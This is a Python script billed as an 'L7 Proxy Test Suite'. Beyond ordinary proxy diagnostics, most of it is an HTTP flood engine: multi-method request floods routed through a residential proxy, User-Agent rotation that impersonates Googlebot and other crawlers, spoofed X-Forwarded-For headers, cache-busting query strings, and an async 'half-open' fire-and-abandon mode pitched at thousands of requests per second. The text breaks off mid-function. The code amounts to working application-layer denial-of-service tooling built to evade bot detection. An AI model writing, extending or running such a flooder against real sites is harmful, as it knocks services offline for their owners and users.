#!/usr/bin/env python3
"""
L7 Proxy Test Suite
-------------------
Tests Layer-7 (HTTP/HTTPS application-layer) events through a
Squid/ProxyChains residential proxy at 10.0.10.118:3128.

Modes (selected from interactive menu)
───────────────────────────────────────
  1  Diagnostic      – 10 sequential diagnostic tests
  2  GET Flood
  3  POST Flood
  4  HEAD Flood
  5  PUT Flood
  6  PATCH Flood
  7  DELETE Flood
  8  OPTIONS Flood
  9  Multi-Vector    – fires ALL methods simultaneously

Flood parameters (prompted interactively):
  • Concurrent connections  (workers / threads)
  • Target RPS              (requests-per-second cap)
  • Duration                (seconds to run)
"""

import sys
import time
import socket
import ssl
import json
import random
import string
import threading
import asyncio
import urllib.request
import urllib.error
import urllib.parse
import http.client
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from typing import Optional, Tuple, List, Dict

# ── Proxy config ──────────────────────────────────────────────────────────────
PROXY_HOST = "10.0.10.118"
PROXY_PORT = 3128
PROXY_URL  = "http://{}:{}".format(PROXY_HOST, PROXY_PORT)

# ── Colour helpers ─────────────────────────────────────────────────────────────
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"

def ok(msg):    print("  {}[+]{} {}".format(GREEN, RESET, msg))
def fail(msg):  print("  {}[-]{} {}".format(RED, RESET, msg))
def info(msg):  print("  {}[*]{} {}".format(CYAN, RESET, msg))
def warn(msg):  print("  {}[!]{} {}".format(YELLOW, RESET, msg))
def section(title):
    print("\n{}{}{}{}".format(BOLD, CYAN, "─"*60, RESET))
    print("{}{}  {}{}".format(BOLD, CYAN, title, RESET))
    print("{}{}{}{}".format(BOLD, CYAN, "─"*60, RESET))

# ── Build a urllib opener that forces all traffic through the proxy ────────────
def build_opener():
    proxy_handler = urllib.request.ProxyHandler({
        "http":  PROXY_URL,
        "https": PROXY_URL,
    })
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    https_handler = urllib.request.HTTPSHandler(context=ctx)
    opener = urllib.request.build_opener(proxy_handler, https_handler)
    opener.addheaders = [
        ("User-Agent",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
         "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"),
        ("Accept",          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Connection",      "keep-alive"),
    ]
    return opener

OPENER = build_opener()

# ─────────────────────────────────────────────────────────────────────────────
# 1. Proxy Reachability
# ─────────────────────────────────────────────────────────────────────────────
def test_proxy_reachability():
    section("TEST 1 – Proxy Reachability (TCP handshake to squid)")
    try:
        t0 = time.time()
        s  = socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=5)
        ms = (time.time() - t0) * 1000
        s.close()
        ok("Connected to {}:{} in {:.1f} ms".format(PROXY_HOST, PROXY_PORT, ms))
        return True
    except Exception as e:
        fail("Cannot reach proxy: {}".format(e))
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 2. External IP leak check
# ─────────────────────────────────────────────────────────────────────────────
def test_egress_ip():
    section("TEST 2 – Egress IP via Proxy  (IP-leak check)")
    for url in ["http://httpbin.org/ip", "http://ifconfig.me/ip"]:
        try:
            t0  = time.time()
            req = urllib.request.Request(url)
            with OPENER.open(req, timeout=10) as resp:
                body = resp.read().decode().strip()
            ms  = (time.time() - t0) * 1000
            try:
                ip = json.loads(body).get("origin", body)
            except Exception:
                ip = body
            ok("Egress IP reported by {}: {}{}{}  ({:.0f} ms)".format(
                url.split("/")[2], BOLD, ip, RESET, ms))
            return ip
        except Exception as e:
            warn("{} failed: {}".format(url, e))
    fail("Could not determine egress IP")
    return None

# ─────────────────────────────────────────────────────────────────────────────
# 3. HTTP GET
# ─────────────────────────────────────────────────────────────────────────────
def test_http_get(target_url):
    section("TEST 3 – HTTP GET  →  {}".format(target_url))
    try:
        req = urllib.request.Request(target_url, method="GET")
        t0  = time.time()
        with OPENER.open(req, timeout=15) as resp:
            status  = resp.status
            headers = dict(resp.headers)
            body    = resp.read()
        ms = (time.time() - t0) * 1000
        ok("Status        : {} {}".format(status, resp.reason))
        ok("Response time : {:.0f} ms".format(ms))
        ok("Body length   : {:,} bytes".format(len(body)))
        info("Server        : {}".format(headers.get("Server", "n/a")))
        info("Content-Type  : {}".format(headers.get("Content-Type", "n/a")))
        info("X-Cache       : {}".format(headers.get("X-Cache", "n/a")))
        return True
    except urllib.error.HTTPError as e:
        warn("HTTP error {}: {}".format(e.code, e.reason))
        return False
    except Exception as e:
        fail("GET failed: {}".format(e))
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 4. HTTP HEAD
# ─────────────────────────────────────────────────────────────────────────────
def test_http_head(target_url):
    section("TEST 4 – HTTP HEAD  →  {}".format(target_url))
    try:
        req = urllib.request.Request(target_url, method="HEAD")
        t0  = time.time()
        with OPENER.open(req, timeout=10) as resp:
            status  = resp.status
            headers = dict(resp.headers)
        ms = (time.time() - t0) * 1000
        ok("Status : {} {}  ({:.0f} ms)".format(status, resp.reason, ms))
        for h in ["Server", "Content-Type", "X-Powered-By",
                  "Strict-Transport-Security", "X-Frame-Options",
                  "X-Content-Type-Options", "Content-Security-Policy"]:
            val = headers.get(h)
            if val:
                info("{:35s}: {}".format(h, val))
        return True
    except urllib.error.HTTPError as e:
        warn("HTTP {} on HEAD – trying GET fallback".format(e.code))
        return False
    except Exception as e:
        fail("HEAD failed: {}".format(e))
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 5. HTTP OPTIONS
# ─────────────────────────────────────────────────────────────────────────────
def test_http_options(target_url):
    section("TEST 5 – HTTP OPTIONS  →  {}".format(target_url))
    try:
        req = urllib.request.Request(target_url, method="OPTIONS")
        req.add_header("Origin", "https://evil.lab")
        req.add_header("Access-Control-Request-Method", "GET")
        t0  = time.time()
        with OPENER.open(req, timeout=10) as resp:
            headers = dict(resp.headers)
            status  = resp.status
        ms = (time.time() - t0) * 1000
        ok("Status : {}  ({:.0f} ms)".format(status, ms))
        for h in ["Allow", "Access-Control-Allow-Origin",
                  "Access-Control-Allow-Methods",
                  "Access-Control-Allow-Headers"]:
            val = headers.get(h)
            if val:
                info("{:40s}: {}".format(h, val))
        return True
    except urllib.error.HTTPError as e:
        warn("HTTP {} – server may not allow OPTIONS".format(e.code))
    except Exception as e:
        fail("OPTIONS failed: {}".format(e))
    return False

# ─────────────────────────────────────────────────────────────────────────────
# 6. Redirect-chain follow
# ─────────────────────────────────────────────────────────────────────────────
def test_redirect_chain(target_url):
    section("TEST 6 – Redirect Chain  →  {}".format(target_url))
    visited = []
    current = target_url

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    no_redir_opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({"http": PROXY_URL, "https": PROXY_URL}),
        urllib.request.HTTPSHandler(context=ctx),
        NoRedirect(),
    )
    no_redir_opener.addheaders = OPENER.addheaders

    for hop in range(10):
        try:
            req = urllib.request.Request(current)
            with no_redir_opener.open(req, timeout=10) as resp:
                status   = resp.status
                location = resp.headers.get("Location")
                visited.append((hop + 1, current, status))
                if status not in (301, 302, 303, 307, 308) or not location:
                    break
                current = urllib.parse.urljoin(current, location)
        except urllib.error.HTTPError as e:
            visited.append((hop + 1, current, e.code))
            break
        except Exception as e:
            fail("Redirect hop {} error: {}".format(hop + 1, e))
            break

    for hop, url, code in visited:
        colour = GREEN if str(code).startswith("2") else YELLOW
        print("  {}Hop {}: [{}] {}{}".format(colour, hop, code, url, RESET))

# ─────────────────────────────────────────────────────────────────────────────
# 7. DNS resolution
# ─────────────────────────────────────────────────────────────────────────────
def test_dns(hostname):
    section("TEST 7 – DNS Resolution  →  {}".format(hostname))
    try:
        t0      = time.time()
        results = socket.getaddrinfo(hostname, 80)
        ms      = (time.time() - t0) * 1000
        ips     = list({str(r[4][0]) for r in results})
        ok("Resolved in {:.1f} ms  →  {}".format(ms, ", ".join(ips)))
        return ips
    except Exception as e:
        fail("DNS failed: {}".format(e))
        return []

# ─────────────────────────────────────────────────────────────────────────────
# 8. TLS/SSL Certificate info
# ─────────────────────────────────────────────────────────────────────────────
def test_tls(hostname, port=443):
    section("TEST 8 – TLS Certificate  →  {}:{}".format(hostname, port))
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE

        proxy_conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=10)
        proxy_conn.set_tunnel(hostname, port)
        proxy_conn.connect()
        raw_sock = proxy_conn.sock

        tls_sock = ctx.wrap_socket(raw_sock, server_hostname=hostname)
        cert     = tls_sock.getpeercert()
        cipher   = tls_sock.cipher()
        proto    = tls_sock.version()
        tls_sock.close()

        ok("TLS version : {}".format(proto))
        ok("Cipher      : {}".format(cipher[0] if cipher else "n/a"))
        if cert:
            subject = {}
            for rdn in cert.get("subject", []):
                for attr in rdn:
                    subject[attr[0]] = attr[1]
            issuer = {}
            for rdn in cert.get("issuer", []):
                for attr in rdn:
                    issuer[attr[0]] = attr[1]
            info("Subject CN  : {}".format(subject.get("commonName", "n/a")))
            info("Issuer      : {}".format(issuer.get("organizationName", "n/a")))
            info("Not before  : {}".format(cert.get("notBefore", "n/a")))
            info("Not after   : {}".format(cert.get("notAfter",  "n/a")))
        else:
            warn("Certificate data not exposed (verify mode is CERT_NONE)")
        return True
    except Exception as e:
        fail("TLS probe failed: {}".format(e))
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 9. HTTP POST
# ─────────────────────────────────────────────────────────────────────────────
def test_http_post(target_url):
    section("TEST 9 – HTTP POST  →  {}".format(target_url))
    payload = json.dumps({"test": "l7_probe", "ts": datetime.utcnow().isoformat()}).encode()
    try:
        req = urllib.request.Request(target_url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        t0  = time.time()
        with OPENER.open(req, timeout=15) as resp:
            status = resp.status
            body   = resp.read()
        ms = (time.time() - t0) * 1000
        ok("Status : {}  ({:.0f} ms)  body={:,} bytes".format(status, ms, len(body)))
        return True
    except urllib.error.HTTPError as e:
        warn("HTTP {} on POST ({}) – may be expected".format(e.code, e.reason))
    except Exception as e:
        fail("POST failed: {}".format(e))
    return False

# ─────────────────────────────────────────────────────────────────────────────
# 10. Latency benchmark
# ─────────────────────────────────────────────────────────────────────────────
def test_latency(target_url, samples=10):
    section("TEST 10 – Latency Benchmark  ({}× GET)  →  {}".format(samples, target_url))
    times = []
    for i in range(1, samples + 1):
        try:
            req = urllib.request.Request(target_url, method="HEAD")
            t0  = time.time()
            with OPENER.open(req, timeout=10) as resp:
                resp.read()
            ms = (time.time() - t0) * 1000
            times.append(ms)
            print("    Sample {:>2}/{}: {:>7.1f} ms".format(i, samples, ms))
        except Exception as e:
            warn("Sample {} failed: {}".format(i, e))
        time.sleep(0.3)

    if times:
        avg = sum(times) / len(times)
        mn  = min(times)
        mx  = max(times)
        jit = mx - mn
        ok("Min={:.1f} ms  Avg={:.1f} ms  Max={:.1f} ms  Jitter={:.1f} ms".format(mn, avg, mx, jit))
    else:
        fail("No latency samples collected")

# ─────────────────────────────────────────────────────────────────────────────
# FLOOD ENGINE
# ─────────────────────────────────────────────────────────────────────────────

_BODY_METHODS = {"POST", "PUT", "PATCH"}

# ── Active flood config (set from preset menu) ────────────────────────────────
_EVASION_PROFILE   = ["rotate"]  # UA pool key
_HEADER_SHUFFLE    = [False]     # shuffle header order per request
_QS_INJECT         = ["off"]     # "off" | "random" | "always"

# ─────────────────────────────────────────────────────────────────────────────
# User-Agent library  (legitimate + spoofed categories)
# ─────────────────────────────────────────────────────────────────────────────
_UA_POOLS = {
    # Real browsers – high-fidelity desktop
    "legit_desktop": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    ],
    # Real browsers – mobile
    "legit_mobile": [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.88 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36 SamsungBrowser/24.0",
        "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    ],
    # Bots / crawlers (spoofed as legitimate crawlers)
    "spoofed_bots": [
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
        "Twitterbot/1.0",
        "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
        "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
        "WhatsApp/2.24.8.77 A",
        "Mozilla/5.0 (compatible; DuckDuckBot/1.1; +http://duckduckgo.com/duckduckbot.html)",
        "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    ],
    # Spoofed / malformed / evasion strings
    "spoofed_evasion": [
        "curl/8.7.1",
        "python-requests/2.31.0",
        "Go-http-client/1.1",
        "Wget/1.21.4 (linux-gnu)",
        "axios/1.6.8",
        "okhttp/4.12.0",
        "Java/21.0.2",
        "Apache-HttpClient/4.5.14 (Java/11.0.22)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0)",
        "",   # blank UA – some WAFs pass this
        "---",
        "x" * 512,   # oversized UA
    ],
    # Mixed: random pick from all pools
    "rotate": [],   # populated dynamically below
}

# Populate the rotate pool with all non-empty UAs from every category
for _pool_name, _pool_list in _UA_POOLS.items():
    if _pool_name != "rotate":
        _UA_POOLS["rotate"].extend([ua for ua in _pool_list if ua])

# ─────────────────────────────────────────────────────────────────────────────
# Accept-Language variants
# ─────────────────────────────────────────────────────────────────────────────
_ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8,en-US;q=0.6",
    "fr-FR,fr;q=0.9,en;q=0.7",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.7",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.7",
    "ru-RU,ru;q=0.8,en;q=0.6",
    "ar-SA,ar;q=0.9,en;q=0.7",
    "*",
]

# ─────────────────────────────────────────────────────────────────────────────
# Accept variants
# ─────────────────────────────────────────────────────────────────────────────
_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,*/*;q=0.9",
    "application/json",
    "text/html",
]

# ─────────────────────────────────────────────────────────────────────────────
# Optional extra headers injected randomly to vary fingerprint
# ─────────────────────────────────────────────────────────────────────────────
_EXTRA_HEADERS = [
    ("X-Forwarded-For",    lambda: "{}.{}.{}.{}".format(
        random.randint(1,254), random.randint(0,255),
        random.randint(0,255), random.randint(1,254))),
    ("X-Real-IP",          lambda: "{}.{}.{}.{}".format(
        random.randint(1,254), random.randint(0,255),
        random.randint(0,255), random.randint(1,254))),
    ("X-Originating-IP",   lambda: "{}.{}.{}.{}".format(
        random.randint(1,254), random.randint(0,255),
        random.randint(0,255), random.randint(1,254))),
    ("Referer",            lambda: random.choice([
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://t.co/",
        "https://l.facebook.com/",
        "https://duckduckgo.com/",
    ])),
    ("Cache-Control",      lambda: random.choice(["no-cache", "max-age=0", "no-store"])),
    ("Pragma",             lambda: "no-cache"),
    ("DNT",                lambda: random.choice(["0", "1"])),
    ("Upgrade-Insecure-Requests", lambda: "1"),
    ("Sec-Fetch-Mode",     lambda: random.choice(["navigate", "cors", "no-cors", "same-origin"])),
    ("Sec-Fetch-Site",     lambda: random.choice(["none", "same-origin", "cross-site", "same-site"])),
    ("Sec-Fetch-Dest",     lambda: random.choice(["document", "empty", "image", "script"])),
]


def _rand_qs(n=3):
    # type: (int) -> str
    """Generate n random query-string key=value pairs."""
    keys   = ["ref", "src", "utm_source", "utm_medium", "q", "s", "id",
               "page", "v", "t", "sid", "token", "cb", "ts", "r"]
    pairs  = []
    for _ in range(n):
        k = random.choice(keys)
        v = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4, 12)))
        pairs.append("{}={}".format(k, v))
    return "&".join(pairs)


def _build_headers(profile):
    # type: (str) -> List[Tuple[str, str]]
    """
    Build a header list for the given evasion profile.
    Header order is shuffled only when _HEADER_SHUFFLE[0] is True.
    """
    pool = _UA_POOLS.get(profile, _UA_POOLS["rotate"])
    ua   = random.choice(pool) if pool else "Mozilla/5.0"

    # Core headers – always present
    core = [
        ("User-Agent",      ua),
        ("Accept",          random.choice(_ACCEPTS)),
        ("Accept-Language", random.choice(_ACCEPT_LANGS)),
        ("Connection",      random.choice(["keep-alive", "close"])),
    ]

    # Randomly inject 0-4 extra headers
    extras = []
    for hdr_name, hdr_fn in random.sample(_EXTRA_HEADERS, k=random.randint(0, 4)):
        extras.append((hdr_name, hdr_fn()))

    combined = core + extras

    if _HEADER_SHUFFLE[0]:
        # Shuffle everything except User-Agent (keep it first)
        ua_hdr = combined[:1]
        rest   = combined[1:]
        random.shuffle(rest)
        return ua_hdr + rest

    return combined


def _inject_qs(url):
    # type: (str) -> str
    """Optionally append random query-string params based on _QS_INJECT setting."""
    mode = _QS_INJECT[0]
    if mode == "off":
        return url
    if mode == "always":
        inject = True
    else:  # "random"
        inject = random.random() < 0.5

    if not inject:
        return url

    sep = "&" if "?" in url else "?"
    return url + sep + _rand_qs(random.randint(1, 4))


def _single_request(target_url, idx, method, profile="rotate"):
    # type: (str, int, str, str) -> Tuple[bool, float, int]
    """Fire one request through the proxy; return (ok, latency_ms, status)."""
    opener = build_opener()
    opener.addheaders = _build_headers(profile)

    # Optionally mutate URL with random query strings
    req_url = _inject_qs(target_url)

    t0 = time.time()
    try:
        body_data = None  # type: Optional[bytes]
        if method in _BODY_METHODS:
            body_data = json.dumps({
                "probe": "l7_flood",
                "idx": idx,
                "ts": datetime.utcnow().isoformat(),
            }).encode()

        req = urllib.request.Request(req_url, data=body_data, method=method)
        if body_data:
            req.add_header("Content-Type", "application/json")

        with opener.open(req, timeout=10) as resp:
            resp.read()
            status = resp.status
        ms = (time.time() - t0) * 1000
        return True, ms, status
    except urllib.error.HTTPError as e:
        ms = (time.time() - t0) * 1000
        return False, ms, e.code
    except Exception:
        return False, 0.0, 0


# ─────────────────────────────────────────────────────────────────────────────
# ASYNC HALF-OPEN FLOOD ENGINE
# ─────────────────────────────────────────────────────────────────────────────
# Strategy:
#   1. Open TCP to proxy → send HTTP CONNECT to tunnel to target host:port
#   2. Once tunnelled, write the full HTTP request line + headers
#   3. DO NOT read the response — close/abandon the connection immediately
#   4. Because we never wait for a response the event loop can fire thousands
#      of these per second with minimal concurrency.
# ─────────────────────────────────────────────────────────────────────────────

def _make_raw_request_bytes(host, path, method, profile):
    # type: (str, str, str, str) -> bytes
    """Build raw HTTP/1.1 request bytes (no body wait)."""
    hdrs = _build_headers(profile)
    lines = ["{} {} HTTP/1.1".format(method, path)]
    lines.append("Host: {}".format(host))
    for name, val in hdrs:
        lines.append("{}: {}".format(name, val))
    lines.append("Connection: close")
    lines.append("")
    lines.append("")
    return "\r\n".join(lines).encode("utf-8", errors="replace")


async def _half_open_worker(target_host, target_port, path, method, profile,
                             semaphore, counters, lock):
    # type: (...) -> None
    """
    Single async half-open request:
    proxy CONNECT → write request → abandon (don't read response).
    """
    async with semaphore:
        try:
            # Connect to proxy
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(PROXY_HOST, PROXY_PORT),
                timeout=5.0,
            )
            # Send HTTP CONNECT to open a tunnel
            connect_req = "CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n\r\n".format(
                target_host, target_port, target_host, target_port)
            writer.write(connect_req.encode())
            await writer.drain()

            # Read proxy CONNECT response (just first line)
            try:
                resp_line = await asyncio.wait_for(reader.readline(), timeout=3.0)
                if b"200" not in resp_line:
                    writer.close()
                    async with asyncio.Lock():
                        pass
                    with lock:
                        counters["errors"] += 1
                        counters["total"]  += 1
                    return
            except Exception:
                writer.close()
                with lock:
                    counters["errors"] += 1
                    counters["total"]  += 1
                return

            # Drain rest of CONNECT response headers
            try:
                while True:
                    line = await asyncio.wait_for(reader.readline(), timeout=2.0)
                    if line in (b"\r\n", b"\n", b""):
                        break
            except Exception:
                pass

            # Optionally inject QS into path
            full_path = path
            qs_mode = _QS_INJECT[0]
            if qs_mode == "always" or (qs_mode == "random" and random.random() < 0.5):
                sep = "&" if "?" in full_path else "?"
                full_path = full_path + sep + _rand_qs(random.randint(1, 3))

            # Write the HTTP request — fire and abandon
            req_bytes = _make_raw_request_bytes(target_host, full_path, method, profile)
            writer.write(req_bytes)
            await writer.drain()

            # Half-open: close immediately without reading response
            writer.close()
            with lock:
                counters["sent"]  += 1
                counters["total"] += 1

        except Exception:
            with lock:
                counters["errors"] += 1
                counters["total"]  += 1


def run_half_open_flood(target_url, concurrency, rps, duration, method, label=None):
    # type: (str, int, float, float, str, Optional[str]) -> Dict
    """
    Async half-open L7 flood.
    Fires HTTP requests through the proxy tunnel but never reads responses.
    Achieves 1,000–10,000+ RPS by eliminating response-wait time.
    """
    parsed     = urllib.parse.urlparse(target_url)
    target_host = parsed.hostname or ""
    target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path        = parsed.path or "/"
    if parsed.query:
        path = path + "?" + parsed.query

    display_label = label or "{} [half-open]".format(method)
    section(
        "HALF-OPEN FLOOD — {}{}{}{}  |  {} async slots  |  {:.0f} RPS target  |  {:.0f}s\n"
        "  {}Target : {}{}\n"
        "  {}Proxy  : {}{}\n"
        "  {}Mode   : {}fire-and-abandon (no response read){}".format(
            BOLD, display_label, RESET, CYAN,
            concurrency, rps, duration,
            CYAN, target_url, RESET,
            CYAN, PROXY_URL, RESET,
            YELLOW, RESET, RESET,
        )
    )

    counters   = {"sent": 0, "errors": 0, "total": 0}
    lock       = threading.Lock()
    wall_start = time.time()
    deadline   = wall_start + duration
    bar_width  = 40

    def _print_progress():
        elapsed    = time.time() - wall_start
        pct        = min(elapsed / duration, 1.0)
        filled     = int(bar_width * pct)
        bar        = "\u2588" * filled + "\u2591" * (bar_width - filled)
        actual_rps = counters["total"] / elapsed if elapsed > 0 else 0
        print(
            "\r  [{}] {:.1f}/{:.0f}s  "
            "{}{}{}sent  {}{}{}err  "
            "{}{:.0f} RPS{}   ".format(
                bar, elapsed, duration,
                GREEN, counters["sent"], RESET,
                RED, counters["errors"], RESET,
                CYAN, actual_rps, RESET,
            ),
            end="", flush=True,
        )

    async def _async_loop():
        semaphore = asyncio.Semaphore(concurrency)
        interval  = 1.0 / rps if rps > 0 else 0.0
        tasks     = []   # type: List[asyncio.Task]
        idx       = 0
        profile   = _EVASION_PROFILE[0]

        while time.time() < deadline:
            t0 = time.time()
            task = asyncio.ensure_future(
                _half_open_worker(
                    target_host, target_port, path, method,
                    profile, semaphore, counters, lock,
                )
            )
            tasks.append(task)
            idx += 1
            _print_progress()

            elapsed_submit = time.time() - t0
            sleep_needed   = interval - elapsed_submit
            if sleep_needed > 0.0001:
                await asyncio.sleep(sleep_needed)

            # Prune done tasks to prevent list bloat
            if idx % 500 == 0:
                tasks = [t for t in tasks if not t.done()]

        # Wait for in-flight tasks (max 5s)
        if tasks:
            await asyncio.wait(tasks, timeout=5)

    # Run the async loop in a thread so we don't block main thread
    loop = asyncio.new_event_loop()
    t    = threading.Thread(target=loop.run_until_complete, args=(_async_loop(),))
    t.start()
    t.join()
    loop.close()
    print()

    wall_elapsed = time.time() - wall_start
    colour       = MAGENTA if label else YELLOW

    print("\n{}  ── {}{}{} Half-Open Summary {}{}{}".format(
        BOLD, colour, display_label, RESET, BOLD, "─"*28, RESET))
    ok("Total fired    : {:,}".format(counters["total"]))
    ok("Requests sent  : {}{:,}{}".format(GREEN, counters["sent"], RESET))
    if counters["errors"]:
        warn("Tunnel errors  : {}{:,}{}".format(RED, counters["errors"], RESET))
    ok("Wall time      : {:.2f} s".format(wall_elapsed))
    ok("Throughput     : {}{:.0f} RPS{}".format(
        BOLD, counters["total"] / wall_elapsed if wall_elapsed > 0 else 0, RESET))
    warn("Note: half-open — responses not read; server-side impact may be higher than RPS suggests")

    return {
        "method":     display_label,
        "total":      counters["total"],
        "success":    counters["sent"],
        "errors":     counters["errors"],
        "wall":       wall_elapsed,
        "rps_actual": counters["total"] / wall_elapsed if wall_elapsed > 0 else 0,
    }


def run_flood(target_url, workers, rps, duration, method, label=None):
    # type: (str, int, float, float, str, Optional[str]) -> Dict
    """
    Run a flood for `duration` seconds at up to `rps` requests/sec
    using `workers` concurrent connections.
    Returns a summary dict so multi-vector can aggregate results.
    """
    display_label = label or method
    section(
        "FLOOD — {}{}{}{}  |  {} conns  |  {:.0f} RPS target  |  {:.0f}s\n"
        "  {}Target : {}{}\n"
        "  {}Proxy  : {}{}".format(
            BOLD, display_label, RESET, CYAN,
            workers, rps, duration,
            CYAN, target_url, RESET,
            CYAN, PROXY_URL, RESET,
        )
    )

    success       = [0]
    errors        = [0]
    total_sent    = [0]
    latencies     = []   # type: List[float]
    status_counts = {}   # type: Dict[int, int]
    lock          = threading.Lock()

    interval   = 1.0 / rps if rps > 0 else 0.0
    wall_start = time.time()
    deadline   = wall_start + duration
    bar_width  = 40

    def _print_progress():
        elapsed = time.time() - wall_start
        pct     = min(elapsed / duration, 1.0)
        filled  = int(bar_width * pct)
        bar     = "\u2588" * filled + "\u2591" * (bar_width - filled)
        actual_rps = total_sent[0] / elapsed if elapsed > 0 else 0
        print(
            "\r  [{}] {:.1f}/{:.0f}s  "
            "{}{}{}  {}{}{}  "
            "{}{:.1f} RPS{}   ".format(
                bar, elapsed, duration,
                GREEN, success[0], RESET,
                RED, errors[0], RESET,
                CYAN, actual_rps, RESET,
            ),
            end="", flush=True,
        )

    def _worker(idx):
        ok_flag, ms, status = _single_request(target_url, idx, method, _EVASION_PROFILE[0])
        with lock:
            total_sent[0] += 1
            if ok_flag:
                success[0] += 1
            else:
                errors[0] += 1
            if ms > 0:
                latencies.append(ms)
            status_counts[status] = status_counts.get(status, 0) + 1
        _print_progress()

    idx = 0
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = []
        while time.time() < deadline:
            submit_time = time.time()
            futures.append(pool.submit(_worker, idx))
            idx += 1
            still_running = [f for f in futures if not f.done()]
            futures = still_running
            elapsed_submit = time.time() - submit_time
            sleep_needed   = interval - elapsed_submit
            if sleep_needed > 0:
                time.sleep(sleep_needed)

        for f in futures:
            try:
                f.result(timeout=15)
            except Exception:
                pass

    wall_elapsed = time.time() - wall_start
    print()  # newline after progress bar

    colour = MAGENTA if label else CYAN
    print("\n{}  ── {}{}{} Flood Summary {}{}{}".format(
        BOLD, colour, display_label, RESET, BOLD, "─"*30, RESET))
    ok("Total sent     : {:,}".format(total_sent[0]))
    ok("Succeeded (2xx): {}{:,}{}".format(GREEN, success[0], RESET))
    if errors[0]:
        warn("Failed         : {}{:,}{}".format(RED, errors[0], RESET))
    ok("Wall time      : {:.2f} s".format(wall_elapsed))
    ok("Throughput     : {}{:.1f} RPS{}".format(
        BOLD, total_sent[0] / wall_elapsed if wall_elapsed > 0 else 0, RESET))

    if latencies:
        latencies.sort()
